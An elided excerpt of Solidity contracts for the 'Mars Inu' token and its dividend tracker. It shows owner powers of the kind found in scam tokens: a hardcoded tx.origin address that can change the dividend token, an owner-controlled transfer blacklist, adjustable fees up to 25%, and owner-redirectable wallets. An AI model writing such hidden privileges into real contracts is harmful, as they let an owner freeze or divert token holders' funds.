...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        ...
        require(tx.origin == 0xF5B2bE867C29186DCFfE70D78d845e5F89873F7b, "Only owner");
...
contract MARSINU is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address payable public marketingWallet = payable(0x898f338330a0632f533B542271d6Ac1a6b6325D5);
    address payable public reserveWallet = payable(0x782fB26d5C69e9e42D85d6Ec0b014F843a2B16C2);
    address payable public growthFundWallet = payable(0x20792BA25047F728BEF654f595968be805c56deD);
    ...
    constructor() ERC20("Mars Inu", "MARSINU") {
    ...
    function updateBuyFees(
        ...
        require(_totalBuyFees <= MAX_FEE_RATE, "Max buy fee was 25");
    ...
    function updateSellFees(
        ...
        require(_totalSellFees <= MAX_FEE_RATE, "Max sell fee was 25");
    ...
    function updateTransferFees(
        ...
        require(_totalTransferFees <= MAX_FEE_RATE, "Max transfer fee was 25");
   ...
   function updateMarketingWallet(address payable newAddress) public onlyOwner {
     require(newAddress != address(marketingWallet), "MARSINU: The marketingWallet already has that address");
    ...
    function updateLiquidityWallet(address payable newAddress) public onlyOwner {
     require(newAddress != address(liquidityWallet), "MARSINU: The liquidityWallet already has that address");
    ...
    function updateReserveWallet(address payable newAddress) public onlyOwner {
     require(newAddress != address(reserveWallet), "MARSINU: The reserveWallet already has that address");
    ...
    function updategrowthFundWallet(address payable newAddress) public onlyOwner {
     require(newAddress != address(growthFundWallet), "MARSINU: The growthFundWallet already has that address");
    ...
    function includeInblockscammer(address wallet) external onlyOwner {
        require(_includeInblockscammer[wallet] != true, "MARSINU: That Wallet already has included In blockscammer");
        _includeInblockscammer[wallet] = true;
    }

    function excludeFromblock(address wallet) external onlyOwner {
        require(_includeInblockscammer[wallet] != false, "MARSINU: That Wallet already has excluded From blockscammer");
    ...
    function _transfer(
        ...
        require(!_includeInblockscammer[to] && !_includeInblockscammer[from], "MARSINU: To/from address is includedInblockscammer");
...
contract DividendTracker is DividendPayingToken, Ownable {
    ...
    function withdrawDividend() public pure override {
        require(false, "Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MARSINU contract.");
    }
